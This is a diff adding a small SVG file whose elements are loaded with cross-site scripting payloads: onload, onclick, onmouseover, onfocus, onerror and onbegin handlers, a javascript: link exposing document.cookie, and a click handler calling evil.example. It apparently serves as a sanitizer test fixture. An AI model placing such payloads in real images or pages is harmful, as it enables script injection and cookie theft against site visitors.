@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300" onload="alert(document.domain)">
+<g id="main__button_0" transform="translate(16, 16)" onclick="fetch('https://evil.example/click')">
+<rect x="0" y="0" width="120" height="40" fill="#E3000B" onmouseover="this.setAttribute('width', 9999)"/>
+<text x="16" y="25" fill="#FFFFFF" font-size="14" onfocus="alert(1)" ONERROR="alert(2)">Send</text>
+</g>
+<a href="javascript:alert(document.cookie)" id="main__link_1">
+<text x="16" y="120" fill="#000000" font-size="13">Click me</text>
+</a>
+<animate attributeName="x" from="0" to="100" begin="0s" dur="1s" onbegin="alert(3)"/>
+</svg>
